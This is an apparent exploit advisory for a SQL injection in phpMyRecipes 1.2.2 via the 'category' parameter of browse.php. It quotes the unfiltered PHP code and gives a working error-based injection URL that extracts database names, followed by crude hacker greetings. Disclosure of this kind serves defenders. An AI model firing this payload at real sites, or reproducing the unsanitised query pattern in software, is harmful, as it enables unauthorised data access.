@@ -1,0 +1,69 @@
+##################################################################################################
+#Exploit Title : phpMyRecipes 1.2.2 SQL injection(page browse.php, parameter category)
+#Author        : Manish Kishan Tanwar
+#Download Link : http://prdownloads.sourceforge.net/php-myrecipes/phpMyRecipes-1.2.2.tar.gz?download
+#Date          : 23/12/2014
+#Discovered at : IndiShell Lab
+# Love to      : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,jagriti
+# email        : manish.1046@gmail.com
+##################################################################################################
+
+////////////////////////
+/// Overview:
+////////////////////////
+
+
+phpMyRecipes is a simple application for storing and retrieving recipes. 
+It uses a web-based interface, for ease of use across any system, and a MySQL database backend for storing the recipes.
+///////////////////////////////
+// Vulnerability Description:
+///////////////////////////////
+vulnerability is due to parameter category in browse.php 
+parameter category is passing to function GetCategoryNameByID without data filtering and due to it, SQL injection vulnerability is arising.
+
+from line 38 to 56
+
+    $category = $_GET['category'];
+  }
+
+  $session = getsession();
+
+  c_header("Browse Recipes", "browse");
+
+  # Build a category string
+  $cat = $category;
+  $catstr = "";
+  while ($cat != 1) {
+    if ($catstr == "") {
+      $catstr = "<A HREF=\"" . slink("browse.php?category=$cat") . "\">" . GetCategoryNameByID($cat) .  "</A>" . $catstr;
+    } else {
+      $catstr = "<A HREF=\"" . slink("browse.php?category=$cat") . "\">" . GetCategoryNameByID($cat) .  "</A> > " . $catstr;
+    }
+
+    $cat = GetCategoryParentByID($cat);
+  }
+  
+
+////////////////
+///  POC   ////
+///////////////
+
+POC image=http://oi57.tinypic.com/inv3ol.jpg
+ payload for extracting database name 
+ set value of category parameter to 1 and add error based SQL injection payload to url
+ 
+http://127.0.0.1/pr/browse.php?category=1 and(select 1 FROM(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
+
+
+                             --==[[ Greetz To ]]==--
+############################################################################################
+#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba,
+#Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
+#Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA,
+#Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Das
+#############################################################################################
+                             --==[[Love to]]==--
+# My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
+#Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Don(Deepika kaushik)
+                       --==[[ Special Fuck goes to ]]==--
+                            <3  suriya Cyber Tyson <3
